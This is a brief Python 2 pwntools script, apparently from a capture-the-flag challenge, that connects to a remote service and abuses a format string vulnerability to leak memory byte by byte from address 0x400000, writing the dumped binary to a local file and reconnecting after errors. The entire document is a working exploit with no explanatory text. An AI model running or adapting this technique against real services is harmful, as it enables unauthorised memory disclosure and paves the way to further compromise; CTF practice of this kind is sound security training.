#!/bin/python2
from pwn import *

s = remote('0.cloud.chals.io', 12655)
start = 0x400000
# start = 0x08048000
addr = start
binfile = ''
while addr < (start + 4096):
    if '0a' in hex(addr):
        addr += 1
        binfile += '\x00'
    try:
        print('[+] %s:' % hex(addr))
        s.sendline('AA.%10$s.BB' + '\x00' + p64(addr))
        data = s.recv(128)
        data = data[data.find('AA.')+3:data.find('.BB')]
        binfile += data + '\x00'
        addr += len(data) + 1
    except Exception as e:
        print('[-] Exception: ' + str(e))
        with open('binfile', 'w') as f:
            f.write(binfile)
        s.close()
        s = remote('0.cloud.chals.io', 12655)
s.close()
with open('binfile', 'w') as f:
    f.write(binfile)
